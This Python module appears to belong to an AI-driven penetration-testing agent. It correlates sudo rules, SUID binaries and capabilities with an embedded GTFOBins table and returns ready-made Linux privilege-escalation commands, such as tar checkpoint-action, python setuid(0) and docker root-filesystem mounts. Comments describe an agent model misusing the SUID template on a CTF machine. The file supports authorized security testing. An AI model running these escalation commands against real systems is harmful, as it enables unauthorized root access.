"""Durable ``nexus.post.privesc_hints`` handler: local GTFOBins correlation.

After ``nexus.post.enum_system``, this tool correlates the collected escalation
surface (``sudo -l`` rules, SUID files, Linux capabilities) against a small,
embedded GTFOBins knowledge base and returns ranked candidate vectors with a
deterministic **proof command** (prints ``uid=0(root)``). It is pure reasoning
over provided data: no network, no scope, no execution — the suggested command
is later run through ``nexus.post.ssh_exec`` under human approval.

This is the ``privesc_hints`` step of the plan.
"""

from __future__ import annotations

import os
import re
from typing import Any

from nexus_core.kernel.models import RiskLevel, RunContext, ToolDefinition, ToolResult

#: Deterministic proof that the escalation worked.
PROOF_EXPECTED = "uid=0(root)"

#: Embedded GTFOBins subset. ``{path}`` is replaced by the resolved binary path.
#: Templates are non-interactive so they complete over an SSH exec channel.
GTFOBINS: dict[str, dict[str, str]] = {
    "tar": {
        "sudo": "sudo {path} cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/usr/bin/id",
        "suid": "{path} cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/usr/bin/id",
    },
    "find": {
        "sudo": "sudo {path} . -maxdepth 0 -exec /usr/bin/id \\;",
        "suid": "{path} . -maxdepth 0 -exec /usr/bin/id \\;",
    },
    "awk": {
        "sudo": "sudo {path} 'BEGIN{{system(\"/usr/bin/id\")}}'",
    },
    "gawk": {
        "sudo": "sudo {path} 'BEGIN{{system(\"/usr/bin/id\")}}'",
    },
    "perl": {
        "sudo": "sudo {path} -e 'exec \"/usr/bin/id\"'",
        "suid": "{path} -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/usr/bin/id\"'",
        "capabilities": "{path} -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/usr/bin/id\"'",
    },
    "python3": {
        "sudo": "sudo {path} -c 'import os; os.system(\"/usr/bin/id\")'",
        "suid": "{path} -c 'import os; os.setuid(0); os.system(\"/usr/bin/id\")'",
        "capabilities": "{path} -c 'import os; os.setuid(0); os.system(\"/usr/bin/id\")'",
    },
    "python": {
        "sudo": "sudo {path} -c 'import os; os.system(\"/usr/bin/id\")'",
        "suid": "{path} -c 'import os; os.setuid(0); os.system(\"/usr/bin/id\")'",
        "capabilities": "{path} -c 'import os; os.setuid(0); os.system(\"/usr/bin/id\")'",
    },
    "ruby": {
        "sudo": "sudo {path} -e 'exec \"/usr/bin/id\"'",
        "suid": "{path} -e 'Process::Sys.setuid(0); exec \"/usr/bin/id\"'",
        "capabilities": "{path} -e 'Process::Sys.setuid(0); exec \"/usr/bin/id\"'",
    },
    "node": {
        "capabilities": "{path} -e 'process.setuid(0); require(\"child_process\").execSync(\"/usr/bin/id\")'",
    },
    "php": {
        "sudo": "sudo {path} -r 'system(\"/usr/bin/id\");'",
        "suid": "{path} -r 'posix_setuid(0); system(\"/usr/bin/id\");'",
        "capabilities": "{path} -r 'posix_setuid(0); system(\"/usr/bin/id\");'",
    },
    "env": {
        "sudo": "sudo {path} /usr/bin/id",
    },
    "socat": {
        "sudo": "sudo {path} - EXEC:/usr/bin/id",
    },
    "chroot": {
        "sudo": "sudo {path} / /usr/bin/id",
    },
    "bash": {
        "sudo": "sudo {path} -c '/usr/bin/id'",
        "suid": "{path} -p -c '/usr/bin/id'",
    },
    "sh": {
        "sudo": "sudo {path} -c '/usr/bin/id'",
        "suid": "{path} -p -c '/usr/bin/id'",
    },
    "gdb": {
        "sudo": "sudo {path} -nx -ex 'python import os; os.system(\"/usr/bin/id\")' -ex quit",
    },
    "ltrace": {
        "sudo": "sudo {path} -o /dev/stdout /usr/bin/id",
    },
    "strace": {
        "sudo": "sudo {path} -o /dev/stdout /usr/bin/id",
    },
    "docker": {
        "sudo": "sudo {path} run -v /:/mnt --rm -it alpine chroot /mnt /usr/bin/id",
    },
    "apt": {
        "sudo": "sudo {path} update -o APT::Update::Pre-Invoke::=/usr/bin/id",
    },
    "apt-get": {
        "sudo": "sudo {path} update -o APT::Update::Pre-Invoke::=/usr/bin/id",
    },
    "tee": {
        "sudo": "echo 'proof' | sudo {path} /root/.omni_proof",
    },
    "cp": {
        "sudo": "sudo {path} /root/root.txt /tmp/omni_proof && sudo /bin/cat /tmp/omni_proof",
    },
}

VECTOR_RANK = {"sudo": 0, "capabilities": 1, "suid": 2}

#: Every candidate declares exactly one kind, in this vocabulary (V1-45).
VECTOR_KINDS: tuple[str, ...] = ("sudo", "capabilities", "suid", "kernel")

#: Observable conditions the agent must have seen for the vector to apply.
#: ``sudo`` and ``suid`` are **different** vectors over the same binary, and the
#: rerun 12 measured the difference on Bounty Hacker: ``/bin/tar`` carried the
#: SUID bit and did **not** elevate (``uid=1001(lin)``, iterations 11 and 13),
#: while ``sudo /bin/tar`` -the same binary, a rule in sudoers and the vault
#: credential on stdin- reached ``uid=0(root)`` in the rerun 10.
VECTOR_PRECONDITIONS: dict[str, tuple[str, ...]] = {
    "sudo": ("user in sudoers", "NOPASSWD or credential in vault"),
    "suid": ("file has SUID bit", "running as the SUID owner"),
    "capabilities": ("binary carries cap_setuid", "capability not dropped by the mount"),
    "kernel": ("kernel version inside an exploitable range", "staging space on the target"),
}


def privesc_hints_definition(tenant_id: str = "system") -> ToolDefinition:
    """Return the durable ToolDefinition for ``nexus.post.privesc_hints``."""
    return ToolDefinition(
        tool_id="nexus.post.privesc_hints",
        effect="read_only",
        name="Privilege-escalation hints",
        tenant_id=tenant_id,
        # V1-45 (rerun 12): the model received the SUID template of ``/bin/tar``
        # and ran it (``uid=1001(lin)``, twice) while the handler also held the
        # ``sudo`` template of the same binary -the one that elevates-. The first
        # sentence is the one the model reads: ``render_tool_catalog`` cuts every
        # description at ``CATALOG_DESCRIPTION_CHARS`` (64), so the distinction
        # and the field names are stated before the explanation.
        description=(
            "Un vector por hint: vector_kind + preconditions; SUID ≠ sudo. "
            "Correlaciona derechos sudo/SUID/capabilities con vectores GTFOBins y "
            "propone el comando de prueba (uid=0). No ejecuta nada. SUID y sudo "
            "son vectores DISTINTOS sobre el mismo binario: puede tener SUID y NO "
            "elevar por SUID, y SÍ elevar por sudo si el usuario está en sudoers. "
            "Verifica las preconditions antes de invocar el comando."
        ),
        input_schema={
            "type": "object",
            "properties": {
                "sudo_rules": {
                    "type": "array",
                    "items": {"type": "string", "maxLength": 1024},
                },
                "suid": {
                    "type": "array",
                    "items": {"type": "string", "maxLength": 1024},
                },
                "capabilities": {
                    "type": "array",
                    "items": {"type": "string", "maxLength": 1024},
                },
            },
            "additionalProperties": False,
        },
        risk=RiskLevel.READ_ONLY,
        required_permissions=["execute:tool:nexus.post.privesc_hints"],
        timeout_seconds=30,
        max_output_bytes=500_000,
        scope_required=False,
    )


def _basename(token: str) -> str:
    return os.path.basename(token.strip().strip("'\""))


def _lookup(name: str) -> dict[str, str]:
    """Return the GTFOBins entry for ``name``, tolerating version suffixes.

    ``python3.8`` -> ``python``; ``perl5.30`` -> ``perl``. Falls back to the
    unversioned family (``python``) before giving up.
    """
    if name in GTFOBINS:
        return GTFOBINS[name]
    stripped = re.sub(r"[\d.]+$", "", name)
    if stripped in GTFOBINS:
        return GTFOBINS[stripped]
    for key in ("python3", "python2", "python", "ruby", "perl", "node", "php"):
        if name.startswith(key):
            return GTFOBINS.get(key, {})
    return {}


def _sudo_candidates(sudo_rules: list[str]) -> list[dict[str, Any]]:
    candidates: list[dict[str, Any]] = []
    for rule in sudo_rules:
        text = str(rule).strip()
        if not text or text.upper() == "ALL":
            continue
        # ``/bin/tar`` or ``/bin/tar *`` -> take the first token's basename.
        first = text.split()[0]
        name = _basename(first)
        template = _lookup(name).get("sudo")
        if not template:
            continue
        candidates.append(
            {
                "binary": name,
                "vector": "sudo",
                "vector_kind": "sudo",
                "preconditions": list(VECTOR_PRECONDITIONS["sudo"]),
                "rule": text,
                "command": template.replace("{path}", first),
                "proof_expected": PROOF_EXPECTED,
            }
        )
    return candidates


def _suid_candidates(suid: list[str]) -> list[dict[str, Any]]:
    candidates: list[dict[str, Any]] = []
    for path in suid:
        text = str(path).strip()
        if not text:
            continue
        name = _basename(text)
        template = _lookup(name).get("suid")
        if not template:
            continue
        candidates.append(
            {
                "binary": name,
                "vector": "suid",
                "vector_kind": "suid",
                "preconditions": list(VECTOR_PRECONDITIONS["suid"]),
                "path": text,
                "command": template.replace("{path}", text),
                "proof_expected": PROOF_EXPECTED,
            }
        )
    return candidates


def _capability_candidates(capabilities: list[str]) -> list[dict[str, Any]]:
    candidates: list[dict[str, Any]] = []
    for line in capabilities:
        text = str(line).strip()
        if not text:
            continue
        parts = text.split()
        if len(parts) < 2:
            continue
        path, caps = parts[0], " ".join(parts[1:])
        if "cap_setuid" not in caps:
            continue
        name = _basename(path)
        template = _lookup(name).get("capabilities")
        if not template:
            continue
        candidates.append(
            {
                "binary": name,
                "vector": "capabilities",
                "vector_kind": "capabilities",
                "preconditions": list(VECTOR_PRECONDITIONS["capabilities"]),
                "path": path,
                "capabilities": caps,
                "command": template.replace("{path}", path),
                "proof_expected": PROOF_EXPECTED,
            }
        )
    return candidates


def analyze_privilege_escalation(
    *, sudo_rules: list[str], suid: list[str], capabilities: list[str]
) -> list[dict[str, Any]]:
    """Return ranked candidate vectors for the collected surface."""
    candidates = (
        _sudo_candidates(sudo_rules)
        + _capability_candidates(capabilities)
        + _suid_candidates(suid)
    )
    candidates.sort(key=lambda item: VECTOR_RANK.get(item["vector"], 99))
    return candidates


async def privesc_hints_handler(arguments: dict, context: RunContext) -> ToolResult:
    """Correlate the escalation surface with GTFOBins (no execution)."""
    sudo_rules = [str(item) for item in (arguments.get("sudo_rules") or [])]
    suid = [str(item) for item in (arguments.get("suid") or [])]
    capabilities = [str(item) for item in (arguments.get("capabilities") or [])]
    if not (sudo_rules or suid or capabilities):
        raise ValueError("provide at least one of sudo_rules, suid or capabilities")

    candidates = analyze_privilege_escalation(
        sudo_rules=sudo_rules, suid=suid, capabilities=capabilities
    )
    return ToolResult(
        output={
            "candidates": candidates,
            "count": len(candidates),
            "note": (
                "Ejecuta el comando con la tool de ejecución SSH bajo "
                "aprobación humana; no persiste cambios."
            ),
        },
        verified=True,
        verification_method="privesc_hints_computed",
        evidence={
            "sudo_rules": len(sudo_rules),
            "suid": len(suid),
            "capabilities": len(capabilities),
            "candidate_vectors": [item["vector"] for item in candidates],
        },
    )
